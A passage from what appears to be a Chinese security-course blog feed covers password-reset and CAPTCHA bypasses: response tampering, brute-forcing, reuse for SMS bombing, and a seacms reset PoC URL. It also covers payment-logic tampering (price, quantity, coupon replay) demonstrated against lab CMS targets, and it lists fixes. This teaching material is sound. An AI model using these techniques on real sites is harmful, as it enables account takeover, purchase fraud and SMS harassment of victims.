href="https://github.com/hetianlab/DefaultCreds-cheat-sheet">https://github.com/hetianlab/DefaultCreds-cheat-sheet</a> 常见平台初始化的弱口令（excle文件）</p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day51 WEB攻防-通用漏洞&amp;验证码识别&amp;复用&amp;调用&amp;找回密码重定向&amp;状态值</title>
      <link href="/2023/03/08/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/"/>
      <url>/2023/03/08/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、找回密码逻辑机制-回显&amp;验证码&amp;指向</p><p>2、验证码验证安全机制-爆破&amp;复用&amp;识别</p><p>3、找回密码-客户端回显&amp;Response状态值&amp;修改重定向</p><p>4、验证码技术-验证码爆破，验证码复用，验证码识别等</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><h4 id="找回密码流程安全："><a href="#找回密码流程安全：" class="headerlink" title="找回密码流程安全："></a>找回密码流程安全：</h4><p>1、用回显状态判断-res前端判断不安全</p><p>2、用用户名重定向-修改标示绕过验证</p><p>3、验证码回显显示-验证码泄漏验证虚设</p><p>4、验证码简单机制-验证码过于简单爆破</p><h4 id="验证码绕过安全："><a href="#验证码绕过安全：" class="headerlink" title="验证码绕过安全："></a>验证码绕过安全：</h4><p>1、验证码简单机制-验证码过于简单爆破</p><p>2、验证码重复使用-验证码验证机制绕过</p><p>3、验证码智能识别-验证码图形码被识别</p><p>4、验证码接口调用-验证码触发机制枚举</p><h3 id="安全修复方案："><a href="#安全修复方案：" class="headerlink" title="#安全修复方案："></a>#安全修复方案：</h3><p>找回机制要进行每一步验证-防绕过重定向</p><p>找回机制要进行服务端验证-防res数据修改</p><p>找回机制要控制验证码安全-防验证码攻击</p><p>验证码接口需验证后被调用-防接口被乱调用</p><p>验证码引用智能化人工判断-防验证码被识别</p><p>验证码采用时间段生效失效-防验证码被复用</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ phpun-res值修改&amp;验证码回显&amp;爆破</p><p>➢ 某APP-res值修改&amp;验证码接口调用&amp;复用</p><p>➢ seacms-验证码识别&amp;找回机制对应值修改</p><h4 id="phpun-res值修改-amp-验证码回显-amp-爆破"><a href="#phpun-res值修改-amp-验证码回显-amp-爆破" class="headerlink" title="#phpun-res值修改&amp;验证码回显&amp;爆破"></a>#phpun-res值修改&amp;验证码回显&amp;爆破</h4><h4 id="1、res修改-绑定手机号时修改返回状态值判定通过"><a href="#1、res修改-绑定手机号时修改返回状态值判定通过" class="headerlink" title="1、res修改-绑定手机号时修改返回状态值判定通过"></a>1、res修改-绑定手机号时修改返回状态值判定通过</h4><p>绑定手机号，假设验证码不知道，随便先输入一个，点击响应数据包</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309132011889.png" alt="image-20230309132011889"></p><p>验证码错误回显为3</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309132109034.png" alt="image-20230309132109034"></p><p>当验证码正确时，此处返回为1，那么可以在输入错误的验证码后修改响应数据包的返回值为1，即可绑定成功（具体会不会成功要看它是否是前端验证，所以提示成功也不一定成功，可能是后端验证）</p><h5 id="2、验证码回显-绑定手机号时验证码前端泄漏被获取"><a href="#2、验证码回显-绑定手机号时验证码前端泄漏被获取" class="headerlink" title="2、验证码回显-绑定手机号时验证码前端泄漏被获取"></a>2、验证码回显-绑定手机号时验证码前端泄漏被获取</h5><p>同样此处绑定手机号，假设验证码不知道，随便先输入一个</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309131557198.png" alt="image-20230309131557198"></p><p>保存抓包，发现验证码在cookie显示了，改成cookie里面的值后绑定成功</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309131655808.png" alt="image-20230309131655808"></p><h4 id="3、验证码爆破-知道验证码规矩进行无次数限制爆破"><a href="#3、验证码爆破-知道验证码规矩进行无次数限制爆破" class="headerlink" title="3、验证码爆破-知道验证码规矩进行无次数限制爆破"></a>3、验证码爆破-知道验证码规矩进行无次数限制爆破</h4><p>由此处可以知道验证码是6位的，如果说对输入验证的次数没有要求的话（即不会改变验证码），就可以用burp的intruder模块爆破</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309132710837.png" alt="image-20230309132710837"></p><p>搜索哪个返回值里面是1</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309133057982.png" alt="image-20230309133057982"></p><h4 id="某APP-res值修改-amp-验证码接口调用-amp-复用"><a href="#某APP-res值修改-amp-验证码接口调用-amp-复用" class="headerlink" title="#某APP-res值修改&amp;验证码接口调用&amp;复用"></a>#某APP-res值修改&amp;验证码接口调用&amp;复用</h4><h4 id="1、res修改-找回密码修改返回状态值判定验证通过"><a href="#1、res修改-找回密码修改返回状态值判定验证通过" class="headerlink" title="1、res修改-找回密码修改返回状态值判定验证通过"></a>1、res修改-找回密码修改返回状态值判定验证通过</h4><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309133453848.png" alt="image-20230309133453848"></p><p>随便输入错误的验证码</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309133628521.png" alt="image-20230309133628521"></p><p>点击返回数据包</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309133727892.png" alt="image-20230309133727892"></p><p>将此处的错误回显改为验证码正确的回显</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309134833288.png" alt="image-20230309134833288"></p><p>发现可以重置密码了</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309134916415.png" alt="image-20230309134916415"></p><h4 id="2、验证码接口调用-抓当前发送验证码数据包后调用"><a href="#2、验证码接口调用-抓当前发送验证码数据包后调用" class="headerlink" title="2、验证码接口调用-抓当前发送验证码数据包后调用"></a>2、验证码接口调用-抓当前发送验证码数据包后调用</h4><p>输入号码后直接点获取手机验证码行不通，因为要先输入验证码</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309135252411.png" alt="image-20230309135252411"></p><p>但是此处，因为验证码可以复用，所以点击获取手机验证码抓包，可以不断更改手机号码造成短信轰炸，正常安全的，每点击一次获取手机验证码都会刷新一次验证码，从而继续执行先输入图片验证码再获取短信验证码的逻辑</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309135420075.png" alt="image-20230309135420075"></p><p>正确的措施：</p><p>获取：</p><p>每一分钟才能触发一次发送验证码 防止乱用</p><p>图像验证码是否正确 防止是机器，确保是人工</p><h4 id="3、验证码复用-抓第一次验证通过的验证码进行复用"><a href="#3、验证码复用-抓第一次验证通过的验证码进行复用" class="headerlink" title="3、验证码复用-抓第一次验证通过的验证码进行复用"></a>3、验证码复用-抓第一次验证通过的验证码进行复用</h4><p>存在复用：第一次用那个验证码发包后抓取，后面继续发送这个数据包依然可行，没有提示需要填写新的验证码</p><p>不存在复用：发一次数据包就更换了当前的验证码</p><h3 id="seacms-验证码识别-amp-找回机制对应值修改"><a href="#seacms-验证码识别-amp-找回机制对应值修改" class="headerlink" title="#seacms-验证码识别&amp;找回机制对应值修改"></a>#seacms-验证码识别&amp;找回机制对应值修改</h3><h4 id="找回机制对应值修改："><a href="#找回机制对应值修改：" class="headerlink" title="找回机制对应值修改："></a>找回机制对应值修改：</h4><p>注册两个帐号（xiaosedi1 &amp;&amp; xiaosedi2），尝试找回(xiaosedi1)密码，重置连接重定向绕过</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309142308759.png" alt="image-20230309142308759"></p><p>跳转到此界面</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309142453809.png" alt="image-20230309142453809"></p><p>复制链接到另一处，尝试更改repswname&#x3D;xiaosedi2，发现失败</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309142651447.png" alt="image-20230309142651447"></p><p>代码审计后分析Poc：</p><p>member.php?mod&#x3D;repsw3&amp;repswcode&#x3D;y&amp;repswname&#x3D;targetUser</p><p>系统默认新用户的repswname&#x3D;y改过密码后才会更改为字符串</p><p><img src="/../images/Day51-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC/image-20230309143533271.png" alt="image-20230309143533271"></p><h4 id="验证码识别：xp-CAPTCHA"><a href="#验证码识别：xp-CAPTCHA" class="headerlink" title="验证码识别：xp_CAPTCHA"></a>验证码识别：xp_CAPTCHA</h4><p><a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a></p><p><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></p><p>使用环境：windows 10 python3.6.5</p><p>安装使用：具体看直播操作</p><p>1、burp安装jypython后导入py文件</p><p>2、安装所需库后python运行server.py</p><p>3、抓操作数据包后设置参数设置引用</p><p>参考案例：<a href="https://www.cnblogs.com/punished/p/14746970.html">https://www.cnblogs.com/punished/p/14746970.html</a></p><p>应用：爆破密码时，接口调用时，测试其他时等</p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day50 WEB攻防-通用漏洞&amp;购买支付逻辑&amp;数据篡改&amp;请求重放&amp;接口替换</title>
      <link href="/2023/02/24/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/"/>
      <url>/2023/02/24/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、商品购买-数量&amp;价格&amp;编号等</p><p>2、支付模式-状态&amp;接口&amp;负数等</p><p>3、折扣处理-优惠券&amp;积分&amp;重放等</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><p>1、熟悉常见支付流程</p><p>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</p><p>2、熟悉那些数据篡改</p><p>商品编号ID，购买价格，购买数量，支付方式，订单号，支付状态等</p><p>3、熟悉那些修改方式</p><p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>1、权限相关-越权&amp;访问控制&amp;未授权访问等</p><p>2、购买支付-数据篡改&amp;支付模式&amp;其他折扣等</p><p>3、下节课</p><p>4、下节课</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 数据篡改-价格&amp;数量&amp;产品</p><p>➢ 修改方式-订单号&amp;数量&amp;优惠券</p><p>➢ 某实例-演示站交易支付逻辑安全</p><p>➢ 代码审计-业务支付逻辑&amp;安全修复</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h5 id="数据篡改-价格-amp-数量-amp-产品"><a href="#数据篡改-价格-amp-数量-amp-产品" class="headerlink" title="#数据篡改-价格&amp;数量&amp;产品"></a>#数据篡改-价格&amp;数量&amp;产品</h5><p>1、修改数量达到价格变动</p><p>2、修改单价达到价格变动</p><p>3、修改产品达到低价购买</p><p>4、修改接口达到成功购买</p><p>靶场：大米cms</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>点击购买大米手机cms</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70-16772395304973.png" alt="在这里插入图片描述"></p><p>观察price&#x3D;5400对应价格，抓包将其修改</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70-16772395978706.png" alt="在这里插入图片描述"></p><p>放包后发现价格变动了，成功修改价格</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70-16772396271589.png" alt="在这里插入图片描述"></p><p>同样的，抓取购买大米测试产品的数据包</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224195747044.png" alt="image-20230224195747044"></p><p>如果在修改数量和价格上面行不通(或者说商品不展示这些参数)，可以尝试以低价(5400)购买高价(6000)的物品，将数据包的关于商品信息的替换，替换除了此处以外的其东西</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224201800675.png" alt="image-20230224201800675"></p><p>观察从6000变成了5400</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224201927150.png" alt="image-20230224201927150"></p><p>还可以测试支付接口的地方，将vx，zfb接口改为自己私人支付接口(但是不一定成功)</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224204836116.png" alt="image-20230224204836116"></p><p>下面数据包中的notify_url是支付宝的支付接口，尝试更改，此处不进行尝试</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224205203855.png" alt="image-20230224205203855"></p><p>支付宝接口中return_url和notify_url的作用：(<a href="https://blog.csdn.net/KeleQAQ/article/details/111500581">https://blog.csdn.net/KeleQAQ/article/details/111500581</a>)</p><h5 id="修改方式-订单号-amp-数量-amp-优惠券"><a href="#修改方式-订单号-amp-数量-amp-优惠券" class="headerlink" title="#修改方式-订单号&amp;数量&amp;优惠券"></a>#修改方式-订单号&amp;数量&amp;优惠券</h5><p>靶场：niushop</p><p>1、修改数量达到价格变动</p><p>无价格可改，尝试改动数量</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307194744046.png" alt="image-20230307194744046"></p><p>发包后价格改变</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307194821374.png" alt="image-20230307194821374"></p><p>2、修改订单达到底价购买</p><p>3、优惠券重放使用&amp;重领使用</p><p>优惠券利用：</p><p>只能领取一次（找其规律，看是否每个优惠券都有一个序列id，用完一个会生产一个id值更大的）</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307222035061.png" alt="image-20230307222035061"></p><p>重复使用-重放数据包（重复将这个优惠券的数据包重复发送）</p><p>防御的手段是：将优惠券编码加密，让攻击者猜不到，使用以后数据库进行删除</p><p>当没有优惠卷提交订单时：</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307210351399.png" alt="image-20230307210351399"></p><p>post内容：goods_sku_list&#x3D;1%3A1&amp;leavemessage&#x3D;&amp;use_coupon&#x3D;0&amp;integral&#x3D;0&amp;account_balance&#x3D;0&amp;pay_type&#x3D;0&amp;buyer_invoice&#x3D;&amp;pick_up_id&#x3D;0&amp;express_company_id&#x3D;1</p><p>当使用优惠券时：<img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307210334233.png" alt="image-20230307210334233"></p><p>post内容：goods_sku_list&#x3D;1%3A1&amp;leavemessage&#x3D;&amp;use_coupon&#x3D;1&amp;integral&#x3D;0&amp;account_balance&#x3D;0&amp;pay_type&#x3D;0&amp;buyer_invoice&#x3D;&amp;pick_up_id&#x3D;0&amp;express_company_id&#x3D;1</p><p><img 